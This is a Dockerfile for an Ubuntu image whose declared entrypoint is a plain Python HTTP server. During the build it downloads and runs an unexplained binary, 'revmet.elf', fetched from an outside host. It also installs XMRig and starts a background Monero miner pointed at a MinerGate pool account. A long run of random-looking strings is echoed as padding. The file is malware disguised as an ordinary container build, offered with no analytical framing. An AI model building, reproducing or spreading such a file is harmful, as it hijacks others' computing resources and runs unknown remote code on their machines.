FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo fDQaj6j8fiyUZmPcUWDE07xlZUjjnXyV Iuo5oBMChjZNFo0DegGCTY5DgJLIzmRh ZaO7iusP4O8NBYgPlO9lHqhJbWr1hmeH BcpmHcHBr6seXV3WunJbiISPhutydAOn fYOOIP0ZpqPxBvAkxDvRTEaPMUINyxZA vZNhcf9qycQ2mz92dZhL7yWPjAE77oyj ANsHUurUsI4pxqXc4CQOWCHbDSrO5fLH wrAg0SUZOG4gCWpGpKWcysWCnBaW9ad7 opTRWsVay67ksfNnfrrVyVF8JFKEm4RK t0U3B5qThrbE7RBuSJLGHqFXnN5sYMqz WPndGVEKwes1m1U8GItVdyLjSxKDZBaQ cnKwHB1oky5zWw3fg36ZKfbJjuu3TDdf 2t3FMq2KaTQ0np2EB9CXBZWMEFGa64w8 8Cp0eapbIUzuaNRtCA31yIRnvTT8oecg 7OLj3TxoBtPwMre7oZkAQWX3JUiQGxb6 FClY9olZZZUd5az0cpfZYYJyHNWxzsk9 OCYJeg9umJhsfBdV9VOCfeJhsUnzs7R2 EGZvhqqk1BFn7hqVsi4PrDcqE8SXnH8S eEJbHXb81mBCPt6Xq5MqnD2xKB46f8kU R0srXIUL7KgRM5fnHyt3kNA909iChcBM c7UNqPjWIkFLTWIgMD3sqqzsgwO9w9gS DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]